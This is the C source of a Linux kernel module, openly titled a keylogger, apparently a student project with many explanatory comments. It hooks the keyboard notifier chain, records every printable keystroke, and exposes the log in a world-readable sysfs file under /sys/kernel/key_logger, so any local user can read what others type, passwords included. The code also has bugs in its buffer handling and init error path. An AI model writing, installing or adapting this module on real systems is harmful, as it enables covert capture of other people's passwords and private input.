//Kernel notifier keylogger Yonor & ilona

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>


// Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys/..
static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
int buf_pos = 0;  // Counting characters to avoid overflow
int keyLog;
static struct kobject *keyLog_obj;

// Prototypes
void keylog_exit(void);
static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf); 
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain

/*like read function return length of buffer. */
static ssize_t keyLog_show(struct kobject *kobj, struct kobj_attribute *attr,char *buf)
{
	
	int len = strlen(keys_buffer);
	memcpy(buf,keys_buffer,BUFFER_LEN);//copy to buf from keeys_buffer
	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
	keys_bf_ptr = keys_buffer; // Reset buffer pointer
	return len;
	
}
static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	
	struct keyboard_notifier_param *param = data;
	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;
		
		// We will only log those key presses that actually represent an ASCII character. 
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) {
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}
		// Beware of buffer overflows in kernel space!! They can be catastrophic!
		//Prevents the OS to cracked in event of OVERFLOW
		if (buf_pos >= BUFFER_LEN) {
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}
		return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
}

/*Initializing the notifier_block
 * The notifier data structure is a simple linked list of function pointers.
 *  The function pointers are registered with ‘functions’ that are to be called when an event occurs. Each module needs to maintain a notifier list. 
 * The functions are registered to this notification list.
 * */
static struct notifier_block nb = {
	.notifier_call = keys_pressed
}; 

/*initialize the struct kobject_attribute (By value)*/
static struct kobj_attribute keyLog_attr = {
	.attr = {.name = "keyLog" ,
			 .mode = 0644,
			},
	.show = keyLog_show
	};
/*Declare an array of this structures ,represent the file.*/
static struct attribute *attrs[] = {
	&keyLog_attr.attr,
	NULL,	
};

/*To group those attributes. without this struct we cant use sysfs_create_group!
 * we insert *attrs[] to this struct.
 * An unnamed attribute group will put all of the attributes directly in
 * the kobject directory.  If we specify a name, a subdirectory will be
 * created for the attributes with the directory being the name of the
 * attribute group.
 */
static struct attribute_group attr_group = {
	.attrs = attrs,
};


/*keylog_init() : create kobject("key_logger") and the variable keylog.*/
static int __init keylog_init(void)
{
	
int err;

/*create a struct kobject dynamically
 * increments refcount and register it eith sysfs
 * name of this kobjeck : "key_logger" , parent of this kobject : kernel_kobject
 * This kobkect will be in : /sys/kernel
 * MUST --> when we will finish withe this structure we need to call kobject_put()*/
keyLog_obj = kobject_create_and_add("key_logger", kernel_kobj);

/*If the kobject was not able to be created*/
if (!keyLog_obj)
		return -ENOMEM;
		
/*This function creates a group for the first time. It will explicitly warn and error if any of the attribute files being created already exist.
 * Returns 0 on success or error.
 * All files are bound together in struct attribute *attrs[]  , 
 * this function get Struct attribute_group and that is why we use struct attribute_group. 
 * sysfs_creare_group --> kobject : keyLog_obj , struct attribute_group : attr_group */	
err = sysfs_create_group(keyLog_obj, &attr_group);

/*Returns 0 on success*/
if (err)
	kobject_put(keyLog_obj);//decrement refcount for kobject. when refcount == 0 -> call Kobject_cleanup() through kobject_release()
							//call kobject_put and the structure will be dynamically freed when it is no longer being used.
						
printk(KERN_INFO "keylog_init() : key_Logger Created successfully");

/***********************************/								
register_keyboard_notifier(&nb);


/*memset(...)-->used to fill a block of memory with a particular value. initialize the keys_buffer
 * keys_buffer -> Starting address of memory to be filled
 * 0 - > The string to be copied
 * BUFFER_LEN -> number of bytes to be copied
 * */
memset(keys_buffer, 0, BUFFER_LEN);
return 0;
}


 void keylog_exit(void)
{
	kobject_put(keyLog_obj);
	unregister_keyboard_notifier(&nb);
	printk(KERN_NOTICE "Keylogger unregister\n");
	printk(KERN_NOTICE "Keylogger module unloaded\n");
	
}


module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yonatan Orozko & Ilona Geftner");
MODULE_DESCRIPTION("Keylogger");
MODULE_VERSION("1.0");